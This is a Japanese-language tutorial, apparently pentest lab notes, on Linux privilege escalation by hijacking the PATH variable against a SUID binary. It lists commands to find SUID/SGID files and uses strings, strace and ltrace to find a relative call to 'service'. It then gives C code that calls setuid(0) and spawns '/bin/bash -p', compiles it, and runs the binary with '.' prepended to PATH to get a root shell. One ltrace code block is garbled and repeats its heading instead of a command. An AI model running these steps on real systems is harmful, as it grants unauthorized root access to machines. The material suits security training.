PATH 環境変数  
PATH 環境変数には、シェルがプログラムを検索しようとするディレクトリのリストが含まれています。 
プログラムが別のプログラムを実行しようとしたときに、完全な (絶対) パスではなくプログラム名のみを指定した場合、シェルは PATH ディレクトリが見つかるまで検索します。   
ユーザーは自分の PATH 変数を完全に制御できるため、書き込み可能なディレクトリ内のプログラムを最初に探すようにシェルに指示できます。    
プログラムが別のプログラムを実行しようとすると、そのプログラムの名前が実行可能ファイルに文字列として埋め込まれている可能性があります。   
実行可能ファイルで文字列を実行して、文字列を見つけることができます。   
strace を使用して、プログラムがどのように実行されているかを確認することもできます。   
ltrace と呼ばれる別のプログラムも役立つ場合があります。   

ファイルに対して文字列を実行する。
```
$ strings /path/to/file
```
コマンドに対してstraceを実行する。
```
$ strace -v -f -e execve <command> 2>&1 | grep exec
```
コマンドに対してltraceを実行する。
```
コマンドに対してltraceを実行する。
```
# Privilege Escalation
1. ターゲット上のSUID/SGIDファイルの検索
```
$ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \;
2> /dev/null
...
-rwsr-sr-x 1 root staff 6883 May 14 2017 /usr/local/bin/suid-env
...
```
suid-env ファイルは、root ユーザー権限で実行する必要があります。   
2. SUIDファイルに対して文字列を実行します。   
```
$ strings /usr/local/bin/suid-env
/lib64/ld-linux-x86-64.so.2
...
service apache2 start
```
このファイルは、フルパスなしでサービスプログラムを実行しようとしている可能性があります。   
3. straceで確認することができます。  
```
$ strace -v -f -e execve /usr/local/bin/suid-env 2>&1 | grep service
[pid 14395] execve("/bin/sh", ["sh", "-c", "service apache2 start"],
...
```
4. オプションで、ltraceで検証することも可能です。
```
$ ltrace /usr/local/bin/suid-env 2>&1 | grep service
system("service apache2 start"
```
これにより、サービスプログラムの実行にシステム機能が使用されていることがわかります。   
5. 次の内容でファイルservice.cを作成します。
```
int main() {
setuid(0);
system("/bin/bash -p");
}
```
6. service.cをコンパイルしてserviceというファイルにします。  
```
$ gcc -o service service.c
```
7. PATH変数にカレントディレクトリ（または新しいサービスの実行ファイルがある場所）をプリペンドし、ルートシェル用のSUIDファイルを実行します。  
```
$ PATH=.:$PATH /usr/local/bin/suid-env
root@debian:~# id
uid=0(root) gid=0(root) groups=0(root) ...
```
